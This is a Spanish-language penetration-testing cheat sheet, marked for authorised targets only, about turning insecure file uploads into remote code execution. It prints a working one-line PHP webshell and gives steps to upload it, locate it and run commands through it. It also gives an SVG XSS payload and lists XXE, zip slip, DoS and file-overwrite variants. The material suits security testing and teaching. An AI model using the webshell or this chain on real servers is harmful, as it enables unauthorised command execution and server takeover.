# File Upload — De subida a RCE (y otras variantes)

Ver índice: [file-upload.md](file-upload.md). **Solo sobre objetivos autorizados.**

## Camino a RCE

1. Sube una webshell evadiendo la validación ([bypass.md](bypass.md)):
```php
<?php system($_GET['c']); ?>
```
2. Localiza la URL del fichero subido (respuesta, patrón de rutas, fuzzing de la carpeta de uploads).
3. Ejecuta: `.../uploads/shell.php?c=id` → confirma con `id`/`whoami`.
4. Salta a reverse shell (`../../04-cheatsheets/por-fase/03-explotacion.md`).

Si la carpeta no ejecuta código pero controlas otra vía (LFI), **incluye** el fichero subido → ver `../injection/lfi-to-rce.md`.

## Variantes sin RCE directa

- **SVG con XSS:** avatar SVG que ejecuta JS al visualizarse.
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```
- **SVG/OOXML con XXE:** ver `../xxe/variants.md`.
- **ZIP slip / path traversal** al descomprimir subidas.
- **Pixel flood / ficheros enormes:** DoS.
- **Sobrescritura** de ficheros existentes por nombre controlado.

## Notas

- El impacto máximo es RCE; documenta también las variantes de menor impacto si RCE no es posible.
